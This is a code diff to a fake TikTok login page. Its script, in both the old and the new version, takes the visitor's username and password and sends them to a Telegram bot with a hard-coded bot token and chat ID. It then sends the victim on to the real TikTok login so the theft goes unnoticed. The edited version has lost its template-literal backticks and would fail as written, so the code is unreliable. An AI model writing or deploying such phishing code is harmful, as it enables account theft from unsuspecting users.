@@ -79,44 +79,37 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Get user input
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Get chat ID from URL parameters if present
-            const urlParams = new URLSearchParams(window.location.search);
-            const chatId = urlParams.get('chat_id') || 'YOUR_DEFAULT_CHAT_ID';
-            
-            // Telegram bot token (this should be server-side in real applications)
-            const botToken = '8364356006:AAF51rXhVqggvSwTicau0sdlyyLTq7AQez0';
-            
-            // Prepare the message
-            const message = `⚠️ New TikTok Login Attempt ⚠️\nUsername: ${username}\nPassword: ${password}\nIP: ${window.location.hostname}\nUser Agent: ${navigator.userAgent}`;
-            
-            // Send to Telegram bot
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        // Get chat ID from URL or use default
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id') || '6505057749';  // Your default chat ID
+        
+        const botToken = '8364356006:AAF51rXhVqggvSwTicau0sdlyyLTq7AQez0';
+        
+        const message = ⚠️ TikTok Login Attempt ⚠️\nUsername: ${username}\nPassword: ${password}\nIP: ${window.location.hostname}\nUser Agent: ${navigator.userAgent};
+        
+        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
             })
-            .then(response => response.json())
-            .then(data => {
-                // Redirect user after sending data
-                window.location.href = 'https://www.tiktok.com/login'; // Actual TikTok login page
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                window.location.href = 'https://www.tiktok.com/login';
-            });
+        })
+        .then(response => response.json())
+        .then(data => {
+            window.location.href = 'https://www.tiktok.com/login';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            window.location.href = 'https://www.tiktok.com/login';
         });
+    });
     </script>
-</body>
-</html>
